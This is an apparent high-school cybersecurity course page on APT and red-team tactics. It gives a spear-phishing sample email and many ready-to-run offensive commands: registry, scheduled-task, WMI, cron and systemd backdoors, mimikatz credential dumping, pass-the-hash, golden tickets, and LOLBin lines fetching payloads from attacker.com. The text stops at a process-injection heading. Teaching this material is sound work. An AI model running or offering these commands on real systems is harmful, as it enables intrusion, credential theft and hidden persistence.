<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lesson 9.3 - NCHS Cybersecurity</title>
    
    
    <link rel="icon" href="../../../img/logo.png">
    
    
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
    
    
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DRPQMPQQS6"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-DRPQMPQQS6');
    </script>
    
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-primary: #0a0e27;
            --bg-secondary: #141b3a;
            --text-primary: #00ff41;
            --text-secondary: #7affa7;
            --text-muted: #4a9960;
            --accent: #ff0844;
            --accent-secondary: #00d4ff;
            --border: #1a3a2a;
        }

        body {
            font-family: 'JetBrains Mono', monospace;
            background: var(--bg-primary);
            color: var(--text-secondary);
            line-height: 1.6;
            min-height: 100vh;
        }

        /* Navigation */
        nav {
            background: var(--bg-secondary);
            border-bottom: 2px solid var(--text-primary);
            padding: 0;
            position: sticky;
            top: 0;
            z-index: 1000;
            box-shadow: 0 4px 20px rgba(0, 255, 65, 0.2);
        }

        .nav-container {
            max-width: 1400px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 30px;
        }

        .nav-logo {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .nav-logo img {
            height: 40px;
            width: auto;
        }

        .nav-logo a {
            font-family: 'Orbitron', sans-serif;
            font-size: 1.5rem;
            font-weight: 900;
            color: var(--text-primary);
            text-decoration: none;
            letter-spacing: 0.1em;
            text-shadow: 0 0 10px var(--text-primary);
        }

        .nav-links {
            display: flex;
            gap: 30px;
            list-style: none;
            align-items: center;
        }

        .nav-links > li {
            position: relative;
        }

        .nav-links a {
            color: var(--text-secondary);
            text-decoration: none;
            font-weight: 600;
            transition: all 0.3s ease;
            padding: 8px 15px;
            border-radius: 4px;
            display: block;
        }

        .nav-links a:hover,
        .nav-links a.active {
            color: var(--text-primary);
            background: rgba(0, 255, 65, 0.1);
            text-shadow: 0 0 10px var(--text-primary);
        }

        /* Dropdown menu */
        .nav-links .dropdown {
            position: relative;
        }

        .nav-links .dropdown > a::after {
            content: ' ‚ñº';
            font-size: 0.7em;
            margin-left: 5px;
        }

        .nav-links .dropdown-content {
            display: none;
            position: absolute;
            top: 100%;
            left: 0;
            background: var(--bg-secondary);
            border: 2px solid var(--text-primary);
            border-radius: 4px;
            min-width: 250px;
            box-shadow: 0 8px 30px rgba(0, 255, 65, 0.3);
            z-index: 1000;
            padding: 10px 0;
            margin-top: 5px;
        }

        .nav-links .dropdown:hover .dropdown-content {
            display: block;
        }

        .nav-links .dropdown-content li {
            list-style: none;
        }

        .nav-links .dropdown-content a {
            padding: 10px 20px;
            border-radius: 0;
        }

        .nav-links .dropdown-content .nested {
            padding-left: 0;
        }

        .nav-links .dropdown-content .nested > strong {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 20px;
            cursor: pointer;
            transition: all 0.3s ease;
            user-select: none;
        }

        .nav-links .dropdown-content .nested > strong:hover {
            background: rgba(0, 255, 65, 0.1);
        }

        .nav-links .dropdown-content .nested > strong::after {
            content: '‚ñº';
            font-size: 0.8em;
            transition: transform 0.3s ease;
            color: var(--text-primary);
        }

        .nav-links .dropdown-content .nested.collapsed > strong::after {
            transform: rotate(-90deg);
        }

        .nav-links .dropdown-content .nested .unit-lessons {
            max-height: 500px;
            overflow: hidden;
            transition: max-height 0.3s ease;
        }

        .nav-links .dropdown-content .nested.collapsed .unit-lessons {
            max-height: 0;
        }

        .nav-links .dropdown-content .nested .unit-lessons li {
            padding-left: 20px;
        }

        .nav-links .dropdown-content .nested a {
            padding: 8px 20px;
            font-size: 0.9em;
            color: var(--text-muted);
        }

        .nav-links .dropdown-content .nested a:hover {
            color: var(--text-primary);
            background: rgba(0, 255, 65, 0.05);
        }

        /* Mobile menu toggle */
        .nav-toggle {
            display: none;
            background: none;
            border: 2px solid var(--text-primary);
            color: var(--text-primary);
            padding: 8px 15px;
            cursor: pointer;
            border-radius: 4px;
        }

        /* Search */
        .search-container {
            position: relative;
            margin-left: 20px;
        }

        .search-input {
            padding: 8px 35px 8px 15px;
            background: var(--bg-primary);
            border: 2px solid var(--border);
            border-radius: 6px;
            color: var(--text-primary);
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.9rem;
            width: 250px;
            transition: all 0.3s ease;
        }

        .search-input:focus {
            outline: none;
            border-color: var(--text-primary);
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
        }

        .search-input::placeholder {
            color: var(--text-muted);
        }

        .search-icon {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-muted);
            pointer-events: none;
        }

        .search-results {
            position: absolute;
            top: calc(100% + 10px);
            left: 0;
            right: 0;
            background: var(--bg-secondary);
            border: 2px solid var(--text-primary);
            border-radius: 8px;
            max-height: 400px;
            overflow-y: auto;
            display: none;
            z-index: 2000;
            box-shadow: 0 8px 30px rgba(0, 255, 65, 0.3);
        }

        .search-results.active {
            display: block;
        }

        .search-result-item {
            padding: 15px;
            border-bottom: 1px solid var(--border);
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .search-result-item:last-child {
            border-bottom: none;
        }

        .search-result-item:hover {
            background: rgba(0, 255, 65, 0.05);
        }

        .search-result-title {
            color: var(--text-primary);
            font-weight: 700;
            margin-bottom: 5px;
        }

        .search-result-path {
            color: var(--text-muted);
            font-size: 0.8rem;
            margin-bottom: 8px;
        }

        .search-result-excerpt {
            color: var(--text-secondary);
            font-size: 0.85rem;
            line-height: 1.4;
        }

        .search-highlight {
            background: var(--text-primary);
            color: var(--bg-primary);
            padding: 2px 4px;
            border-radius: 2px;
            font-weight: 700;
        }

        .search-no-results {
            padding: 20px;
            text-align: center;
            color: var(--text-muted);
        }

        .search-results::-webkit-scrollbar {
            width: 8px;
        }

        .search-results::-webkit-scrollbar-track {
            background: var(--bg-primary);
        }

        .search-results::-webkit-scrollbar-thumb {
            background: var(--text-primary);
            border-radius: 4px;
        }

        /* Main Content */
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 40px 30px;
        }

        /* Typography */
        h1, h2, h3, h4, h5, h6 {
            font-family: 'Orbitron', sans-serif;
            color: var(--text-primary);
            margin-top: 2rem;
            margin-bottom: 1rem;
            font-weight: 700;
        }

        h1 {
            font-size: 2.5rem;
            text-shadow: 0 0 20px var(--text-primary);
            letter-spacing: 0.05em;
            border-bottom: 2px solid var(--text-primary);
            padding-bottom: 15px;
        }

        h2 {
            font-size: 2rem;
            border-left: 4px solid var(--text-primary);
            padding-left: 15px;
        }

        h3 { font-size: 1.5rem; }
        h4 { font-size: 1.25rem; }

        p {
            margin-bottom: 1.2rem;
            color: var(--text-secondary);
        }

        a {
            color: var(--accent-secondary);
            text-decoration: none;
            transition: all 0.3s ease;
        }

        a:hover {
            color: var(--text-primary);
            text-shadow: 0 0 10px var(--text-primary);
        }

        /* Code Blocks */
        code {
            background: var(--bg-secondary);
            color: var(--text-primary);
            padding: 2px 8px;
            border-radius: 4px;
            border: 1px solid var(--border);
            font-family: 'JetBrains Mono', monospace;
        }

        pre {
            background: var(--bg-secondary);
            border: 2px solid var(--text-primary);
            border-radius: 8px;
            padding: 20px;
            overflow-x: auto;
            margin: 20px 0;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
        }

        pre code {
            background: transparent;
            border: none;
            padding: 0;
        }

        /* Lists */
        ul, ol {
            margin-left: 30px;
            margin-bottom: 1.2rem;
        }

        li {
            margin-bottom: 0.5rem;
            color: var(--text-secondary);
        }

        li::marker {
            color: var(--text-primary);
        }

        /* Tables */
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            background: var(--bg-secondary);
            border: 1px solid var(--border);
        }

        th {
            background: var(--bg-primary);
            color: var(--text-primary);
            padding: 12px;
            text-align: left;
            border: 1px solid var(--text-primary);
            font-weight: 700;
        }

        td {
            padding: 12px;
            border: 1px solid var(--border);
        }

        tr:hover {
            background: rgba(0, 255, 65, 0.05);
        }

        /* Blockquotes */
        blockquote {
            border-left: 4px solid var(--text-primary);
            background: var(--bg-secondary);
            padding: 15px 20px;
            margin: 20px 0;
            font-style: italic;
        }

        /* Images */
        img {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            margin: 20px 0;
        }

        /* Horizontal Rule */
        hr {
            border: none;
            border-top: 2px solid var(--text-primary);
            margin: 30px 0;
            opacity: 0.3;
        }

        /* Footer */
        footer {
            background: var(--bg-secondary);
            border-top: 2px solid var(--text-primary);
            padding: 30px;
            margin-top: 60px;
            text-align: center;
            color: var(--text-muted);
        }

        /* Scanline Effect */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(
                to bottom,
                transparent 50%,
                rgba(0, 255, 65, 0.02) 51%
            );
            background-size: 100% 4px;
            pointer-events: none;
            z-index: 9999;
            animation: scan 8s linear infinite;
        }

        @keyframes scan {
            0% { transform: translateY(0); }
            100% { transform: translateY(100%); }
        }

        /* Selection */
        ::selection {
            background: var(--text-primary);
            color: var(--bg-primary);
        }

        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 12px;
            background: var(--bg-primary);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--text-primary);
            border-radius: 6px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--text-secondary);
        }

        /* Responsive */
        @media (max-width: 768px) {
            .nav-toggle {
                display: block;
            }

            .nav-links {
                display: none;
                position: absolute;
                top: 100%;
                left: 0;
                right: 0;
                background: var(--bg-secondary);
                flex-direction: column;
                padding: 20px;
                border-bottom: 2px solid var(--text-primary);
            }

            .nav-links.active {
                display: flex;
            }

            h1 {
                font-size: 2rem;
            }

            .container {
                padding: 20px 15px;
            }

            .search-container {
                margin-left: 10px;
            }

            .search-input {
                width: 200px;
            }
        }

        /* Search Box */
        .search-box {
            padding: 10px;
            background: var(--bg-primary);
            border: 1px solid var(--text-primary);
            border-radius: 4px;
            color: var(--text-primary);
            font-family: 'JetBrains Mono', monospace;
        }

        .search-box::placeholder {
            color: var(--text-muted);
        }

        /* Lesson Navigation */
        .lesson-nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 60px 0 40px 0;
            padding: 30px;
            background: var(--bg-secondary);
            border-radius: 12px;
            border: 1px solid var(--border);
        }

        .lesson-nav-button {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 15px 30px;
            background: var(--bg-primary);
            border: 2px solid var(--text-primary);
            border-radius: 8px;
            color: var(--text-primary);
            text-decoration: none;
            font-weight: 600;
            transition: all 0.3s ease;
            font-family: 'JetBrains Mono', monospace;
        }

        .lesson-nav-button:hover {
            background: var(--text-primary);
            color: var(--bg-primary);
            transform: translateY(-3px);
            box-shadow: 0 10px 30px rgba(0, 255, 65, 0.3);
        }

        .lesson-nav-button.disabled {
            opacity: 0.3;
            pointer-events: none;
        }

        .lesson-nav-button .arrow {
            font-size: 1.2rem;
            font-weight: bold;
        }

        .lesson-nav-info {
            text-align: center;
            color: var(--text-secondary);
        }

        .lesson-nav-info .current-lesson {
            font-size: 0.9rem;
            color: var(--text-muted);
            margin-bottom: 5px;
        }

        .lesson-nav-info .lesson-title {
            font-size: 1.1rem;
            font-weight: 700;
            color: var(--text-primary);
        }

        @media (max-width: 768px) {
            .lesson-nav {
                flex-direction: column;
                gap: 20px;
            }

            .lesson-nav-button {
                width: 100%;
                justify-content: center;
            }

            .lesson-nav-info {
                order: -1;
            }
        }
    </style>
</head>
<body>
    <nav>
        <div class="nav-container">
            <div class="nav-logo">
                
                <img src="../../../img/logo.png" alt="Logo">
                
                <a href="https://mohamed-morsy33.github.io/cybersecuritynchs/">NCHS Cybersecurity</a>
            </div>
            
            <button class="nav-toggle" onclick="toggleMenu()">MENU</button>
            
            <ul class="nav-links" id="navLinks">
                
                <li >
                    
                        <a href="../../.." 
                           >
                            Home
                        </a>
                    
                </li>
                
                <li class="dropdown">
                    
                        <a href="#">Curriculum</a>
                        <ul class="dropdown-content">
                            
                                
                                    <li class="nested collapsed">
                                        <strong>Unit 1</strong>
                                        <ul class="unit-lessons">
                                            
                                            <li>
                                                <a href="../../unit1/lesson1-1/">Lesson 1.1</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit1/lesson1-2/">Lesson 1.2</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit1/lesson1-3/">Lesson 1.3</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit1/lesson1-4/">Lesson 1.4</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit1/lesson1-5/">Lesson 1.5</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit1/lesson1-6/">Lesson 1.6</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit1/installation-process/">Linux Installation Process</a>
                                            </li>
                                            
                                        </ul>
                                    </li>
                                
                            
                                
                                    <li class="nested collapsed">
                                        <strong>Unit 2</strong>
                                        <ul class="unit-lessons">
                                            
                                            <li>
                                                <a href="../../unit2/lesson2-1/">Lesson 2.1</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit2/lesson2-2/">Lesson 2.2</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit2/lesson2-3/">Lesson 2.3</a>
                                            </li>
                                            
                                        </ul>
                                    </li>
                                
                            
                                
                                    <li class="nested collapsed">
                                        <strong>Unit 3</strong>
                                        <ul class="unit-lessons">
                                            
                                            <li>
                                                <a href="../../unit3/lesson3-1/">Lesson 3.1</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit3/lesson3-2/">Lesson 3.2</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit3/lesson3-3/">Lesson 3.3</a>
                                            </li>
                                            
                                        </ul>
                                    </li>
                                
                            
                                
                                    <li class="nested collapsed">
                                        <strong>Unit 4</strong>
                                        <ul class="unit-lessons">
                                            
                                            <li>
                                                <a href="../../unit4/lesson4-1/">Lesson 4.1</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit4/lesson4-2/">Lesson 4.2</a>
                                            </li>
                                            
                                        </ul>
                                    </li>
                                
                            
                                
                                    <li class="nested collapsed">
                                        <strong>Unit 5</strong>
                                        <ul class="unit-lessons">
                                            
                                            <li>
                                                <a href="../../unit5/lesson5-1/">Lesson 5.1</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit5/lesson5-2/">Lesson 5.2</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit5/lesson5-3/">Lesson 5.3</a>
                                            </li>
                                            
                                        </ul>
                                    </li>
                                
                            
                                
                                    <li class="nested collapsed">
                                        <strong>Unit 6</strong>
                                        <ul class="unit-lessons">
                                            
                                            <li>
                                                <a href="../../unit6/lesson6-1/">Lesson 6.1</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit6/lesson6-2/">Lesson 6.2</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit6/lesson6-3/">Lesson 6.3</a>
                                            </li>
                                            
                                        </ul>
                                    </li>
                                
                            
                                
                                    <li class="nested collapsed">
                                        <strong>Unit 7</strong>
                                        <ul class="unit-lessons">
                                            
                                            <li>
                                                <a href="../../unit7/lesson7-1/">Lesson 7.1</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit7/lesson7-2/">Lesson 7.2</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit7/lesson7-3/">Lesson 7.3</a>
                                            </li>
                                            
                                        </ul>
                                    </li>
                                
                            
                                
                                    <li class="nested collapsed">
                                        <strong>Unit 8</strong>
                                        <ul class="unit-lessons">
                                            
                                            <li>
                                                <a href="../../unit8/lesson8-1/">Lesson 8.1</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit8/lesson8-2/">Lesson 8.2</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit8/lesson8-3/">Lesson 8.3</a>
                                            </li>
                                            
                                        </ul>
                                    </li>
                                
                            
                                
                                    <li class="nested collapsed">
                                        <strong>Unit 9</strong>
                                        <ul class="unit-lessons">
                                            
                                            <li>
                                                <a href="../lesson9-1/">Lesson 9.1</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../lesson9-2/">Lesson 9.2</a>
                                            </li>
                                            
                                            <li>
                                                <a href="./">Lesson 9.3</a>
                                            </li>
                                            
                                        </ul>
                                    </li>
                                
                            
                                
                                    <li class="nested collapsed">
                                        <strong>Unit 10</strong>
                                        <ul class="unit-lessons">
                                            
                                            <li>
                                                <a href="../../unit10/lesson10-1/">Lesson 10.1</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit10/lesson10-2/">Lesson 10.2</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit10/lesson10-3/">Lesson 10.3</a>
                                            </li>
                                            
                                        </ul>
                                    </li>
                                
                            
                                
                                    <li class="nested collapsed">
                                        <strong>Unit 11</strong>
                                        <ul class="unit-lessons">
                                            
                                            <li>
                                                <a href="../../unit11/lesson11-1/">Lesson 11.1</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit11/lesson11-2/">Lesson 11.2</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit11/lesson11-3/">Lesson 11.3</a>
                                            </li>
                                            
                                        </ul>
                                    </li>
                                
                            
                        </ul>
                    
                </li>
                
                <li >
                    
                        <a href="../../../test/" 
                           >
                            Terminal
                        </a>
                    
                </li>
                
            </ul>

            <div class="search-container">
                <input type="text" 
                       class="search-input" 
                       id="searchInput" 
                       placeholder="Search lessons..."
                       autocomplete="off">
                <span class="search-icon">üîç</span>
                <div class="search-results" id="searchResults"></div>
            </div>
        </div>
    </nav>

    <div class="container">
        
        <h1 id="apt-tactics-and-red-team-operations">APT Tactics and Red Team Operations</h1>
<p>Advanced Persistent Threats (APTs) and sophisticated red teams use tactics far beyond simple exploits. This lesson explores the methodologies, techniques, and tools used in advanced offensive operations.</p>
<h2 id="the-kill-chain">The Kill Chain</h2>
<h3 id="lockheed-martin-cyber-kill-chain">Lockheed Martin Cyber Kill Chain</h3>
<p><strong>7 stages of attack:</strong></p>
<ol>
<li><strong>Reconnaissance</strong> - Research target</li>
<li><strong>Weaponization</strong> - Create malicious payload</li>
<li><strong>Delivery</strong> - Transmit weapon to target</li>
<li><strong>Exploitation</strong> - Trigger vulnerability</li>
<li><strong>Installation</strong> - Install backdoor</li>
<li><strong>Command &amp; Control (C2)</strong> - Establish communication</li>
<li><strong>Actions on Objectives</strong> - Achieve goal</li>
</ol>
<p><strong>Defensive value:</strong> Break the chain at any point to stop attack.</p>
<h3 id="mitre-attck-framework">MITRE ATT&amp;CK Framework</h3>
<p><strong>Structured knowledge base of tactics and techniques.</strong></p>
<p><strong>14 Tactics:</strong>
1. Reconnaissance
2. Resource Development
3. Initial Access
4. Execution
5. Persistence
6. Privilege Escalation
7. Defense Evasion
8. Credential Access
9. Discovery
10. Lateral Movement
11. Collection
12. Command and Control
13. Exfiltration
14. Impact</p>
<p>Each tactic contains multiple techniques and sub-techniques.</p>
<p><strong>Example - Persistence Techniques:</strong>
- Boot or Logon Autostart Execution
- Create Account
- Scheduled Task/Job
- Valid Accounts
- Browser Extensions
- Office Application Startup</p>
<h2 id="initial-access">Initial Access</h2>
<h3 id="spear-phishing">Spear Phishing</h3>
<p><strong>Targeted phishing against specific individuals.</strong></p>
<p><strong>Components of successful spear phishing:</strong>
- Reconnaissance (social media, LinkedIn, company site)
- Personalization (reference specific projects, people)
- Context (timing matters - before deadlines, holidays)
- Credible sender (compromised account or spoofing)
- Compelling action (urgency, authority, curiosity)</p>
<p><strong>Example email:</strong></p>
<pre><code>From: IT Support &lt;itsupport@company.com&gt;
To: john.smith@company.com
Subject: URGENT: Password Reset Required - Security Alert

Hi John,

We've detected suspicious login attempts on your account from 
an IP address in Russia. For your security, please reset your 
password immediately using this secure link:

https://company-password-reset.com/reset?token=abc123

This link expires in 2 hours. If you don't reset your password,
your account will be locked.

Thank you,
IT Security Team
</code></pre>
<p><strong>Red flags defenders should catch:</strong>
- Domain typosquatting (company vs company)
- Unusual urgency
- External link for password reset
- Grammar/spelling errors
- Sender address doesn't match display name</p>
<h3 id="watering-hole-attacks">Watering Hole Attacks</h3>
<p><strong>Compromise websites target visits.</strong></p>
<p><strong>Process:</strong>
1. Identify target organization
2. Research where employees browse
3. Compromise those websites
4. Inject malware/exploit
5. Wait for target to visit</p>
<p><strong>Example:</strong>
- Target: Defense contractor employees
- Watering hole: Industry news site they all read
- Payload: Browser exploit or malicious download</p>
<h3 id="supply-chain-attacks">Supply Chain Attacks</h3>
<p><strong>Compromise vendors to reach ultimate target.</strong></p>
<p><strong>Types:</strong>
- Software supply chain (malicious updates)
- Hardware supply chain (backdoored components)
- Service provider compromise (access to multiple clients)</p>
<p><strong>Famous examples:</strong>
- SolarWinds (Orion platform compromise)
- CCleaner (malicious update)
- ASUS Live Update (backdoored software)</p>
<h2 id="persistence-mechanisms">Persistence Mechanisms</h2>
<h3 id="registry-run-keys-windows">Registry Run Keys (Windows)</h3>
<pre><code class="language-powershell"># Current user
reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v Backdoor /t REG_SZ /d &quot;C:\malware.exe&quot;

# All users (requires admin)
reg add &quot;HKLM\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v Backdoor /t REG_SZ /d &quot;C:\malware.exe&quot;
</code></pre>
<h3 id="scheduled-tasks">Scheduled Tasks</h3>
<pre><code class="language-powershell"># Create scheduled task
schtasks /create /tn &quot;Windows Update&quot; /tr &quot;C:\malware.exe&quot; /sc onlogon /ru SYSTEM

# Or with XML for more control
schtasks /create /tn &quot;Update&quot; /xml task.xml
</code></pre>
<h3 id="service-installation">Service Installation</h3>
<pre><code class="language-powershell"># Create malicious service
sc create &quot;WindowsUpdater&quot; binPath= &quot;C:\malware.exe&quot; start= auto

# Start service
sc start &quot;WindowsUpdater&quot;
</code></pre>
<h3 id="wmi-event-subscription">WMI Event Subscription</h3>
<p><strong>Fileless persistence:</strong></p>
<pre><code class="language-powershell"># Create event filter (trigger)
$Filter = Set-WmiInstance -Class __EventFilter -Namespace &quot;root\subscription&quot; -Arguments @{
    Name = &quot;UpdateFilter&quot;
    EventNamespace = &quot;root\cimv2&quot;
    QueryLanguage = &quot;WQL&quot;
    Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'&quot;
}

# Create consumer (action)
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace &quot;root\subscription&quot; -Arguments @{
    Name = &quot;UpdateConsumer&quot;
    CommandLineTemplate = &quot;powershell.exe -enc &lt;base64_payload&gt;&quot;
}

# Bind filter to consumer
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace &quot;root\subscription&quot; -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
</code></pre>
<h3 id="linux-persistence">Linux Persistence</h3>
<p><strong>Cron jobs:</strong></p>
<pre><code class="language-bash"># User crontab
echo &quot;@reboot /tmp/.hidden/backdoor.sh&quot; | crontab -

# System-wide
echo &quot;@reboot root /tmp/.hidden/backdoor.sh&quot; &gt;&gt; /etc/crontab
</code></pre>
<p><strong>Systemd service:</strong></p>
<pre><code class="language-bash"># Create service file
cat &gt; /etc/systemd/system/update.service &lt;&lt; EOF
[Unit]
Description=System Update Service

[Service]
Type=simple
ExecStart=/tmp/.hidden/backdoor.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
systemctl enable update.service
systemctl start update.service
</code></pre>
<p><strong>SSH keys:</strong></p>
<pre><code class="language-bash"># Add attacker's public key
mkdir -p ~/.ssh
echo &quot;ssh-rsa AAAA...&quot; &gt;&gt; ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
</code></pre>
<h2 id="credential-access">Credential Access</h2>
<h3 id="credential-dumping">Credential Dumping</h3>
<p><strong>Mimikatz (Windows):</strong></p>
<pre><code class="language-powershell"># Dump passwords from LSASS
mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;

# Dump cached credentials
mimikatz.exe &quot;lsadump::cache&quot; &quot;exit&quot;

# Dump SAM database
mimikatz.exe &quot;lsadump::sam&quot; &quot;exit&quot;

# Export tickets for pass-the-ticket
mimikatz.exe &quot;sekurlsa::tickets /export&quot; &quot;exit&quot;
</code></pre>
<p><strong>Dumping /etc/shadow (Linux):</strong></p>
<pre><code class="language-bash"># Read shadow file (requires root)
cat /etc/shadow

# Unshadow for cracking
unshadow /etc/passwd /etc/shadow &gt; hashes.txt
john hashes.txt
</code></pre>
<h3 id="pass-the-hash">Pass-the-Hash</h3>
<p><strong>Use NTLM hash without cracking password.</strong></p>
<pre><code class="language-bash"># Using pth-toolkit
pth-winexe -U domain/user%hash //target cmd.exe

# Using Impacket
psexec.py -hashes :ntlm_hash user@target

# Using CrackMapExec
crackmapexec smb target -u user -H ntlm_hash
</code></pre>
<h3 id="kerberoasting">Kerberoasting</h3>
<p><strong>Extract and crack service account passwords.</strong></p>
<pre><code class="language-powershell"># Request service tickets
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;HTTP/server.domain.com&quot;

# Export tickets
Invoke-Mimikatz -Command '&quot;kerberos::list /export&quot;'

# Offline cracking
hashcat -m 13100 ticket.kirbi wordlist.txt
</code></pre>
<h3 id="golden-ticket-attack">Golden Ticket Attack</h3>
<p><strong>Forge Kerberos tickets with compromised krbtgt hash.</strong></p>
<pre><code class="language-powershell"># Get krbtgt hash (domain admin required)
mimikatz.exe &quot;lsadump::dcsync /domain:company.com /user:krbtgt&quot;

# Create golden ticket
mimikatz.exe &quot;kerberos::golden /user:Administrator /domain:company.com /sid:S-1-5-21-... /krbtgt:hash /ptt&quot;

# Now have domain admin access indefinitely
</code></pre>
<h2 id="lateral-movement">Lateral Movement</h2>
<h3 id="pass-the-ticket">Pass-the-Ticket</h3>
<pre><code class="language-powershell"># Export tickets
mimikatz.exe &quot;sekurlsa::tickets /export&quot;

# Import ticket
mimikatz.exe &quot;kerberos::ptt ticket.kirbi&quot;

# Access remote system
dir \\server\c$
</code></pre>
<h3 id="psexec">PsExec</h3>
<pre><code class="language-bash"># Using Sysinternals PsExec
psexec.exe \\target -u domain\user -p password cmd.exe

# Using Impacket
psexec.py domain/user:password@target
</code></pre>
<h3 id="wmi-execution">WMI Execution</h3>
<pre><code class="language-powershell"># Execute command remotely
wmic /node:target /user:domain\user /password:pass process call create &quot;cmd.exe /c whoami&quot;

# Using PowerShell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;cmd.exe /c command&quot; -ComputerName target -Credential $cred
</code></pre>
<h3 id="ssh-lateral-movement">SSH Lateral Movement</h3>
<pre><code class="language-bash"># Use compromised keys
ssh -i stolen_key user@target

# Port forwarding to reach internal systems
ssh -L 3389:internal-server:3389 user@jump-host

# Dynamic SOCKS proxy
ssh -D 8080 user@target
# Configure proxychains to use localhost:8080
proxychains nmap 10.0.0.0/24
</code></pre>
<h2 id="command-and-control-c2">Command and Control (C2)</h2>
<h3 id="c2-frameworks">C2 Frameworks</h3>
<p><strong>Cobalt Strike:</strong>
- Professional red team tool
- Beacon payload (HTTP, DNS, SMB)
- Malleable C2 profiles (customize traffic)
- Post-exploitation modules</p>
<p><strong>Metasploit:</strong>
- Meterpreter payload
- Multiple C2 protocols
- Extensive post-exploitation</p>
<p><strong>Empire/Starkiller:</strong>
- PowerShell-based (Windows)
- Python-based (Linux/Mac)
- Modular architecture</p>
<p><strong>Covenant:</strong>
- .NET-based C2
- Good for modern Windows</p>
<h3 id="c2-communication-channels">C2 Communication Channels</h3>
<p><strong>HTTP/HTTPS:</strong></p>
<pre><code>Beacon ‚Üí C2 Server
GET /login.php HTTP/1.1
Host: legitimate-looking-domain.com
Cookie: session=&lt;encrypted_data&gt;
</code></pre>
<p><strong>DNS:</strong></p>
<pre><code>Query: a8f3d2e1.command.attacker.com
Response: IP address encodes command

Query: 01b2c3d4.exfil.attacker.com (data exfiltration)
</code></pre>
<p><strong>Social Media:</strong>
- Commands via Twitter/Facebook posts
- Responses via comments
- Steganography in images</p>
<p><strong>Cloud Storage:</strong>
- Commands in Dropbox files
- Implant checks periodically
- Legitimate traffic, hard to block</p>
<h3 id="domain-fronting">Domain Fronting</h3>
<p><strong>Hide C2 destination using CDN.</strong></p>
<pre><code>SNI: legitimate-cdn.cloudfront.net
Host header: attacker-controlled.cloudfront.net

CDN routes to attacker server based on Host header,
but TLS handshake shows legitimate domain.
</code></pre>
<h2 id="defense-evasion">Defense Evasion</h2>
<h3 id="living-off-the-land-lolbins">Living Off the Land (LOLBins)</h3>
<p><strong>Use legitimate Windows binaries for malicious purposes.</strong></p>
<p><strong>Examples:</strong></p>
<pre><code class="language-powershell"># Download file using certutil
certutil.exe -urlcache -f http://attacker.com/malware.exe malware.exe

# Execute script using regsvr32
regsvr32.exe /s /n /u /i:http://attacker.com/evil.sct scrobj.dll

# Download and execute using mshta
mshta.exe http://attacker.com/payload.hta

# Binary proxy execution using rundll32
rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;document.write(&quot;&lt;script&gt;alert('code')&lt;/script&gt;&quot;)
</code></pre>
<h3 id="process-injection">Process Injection</h3>
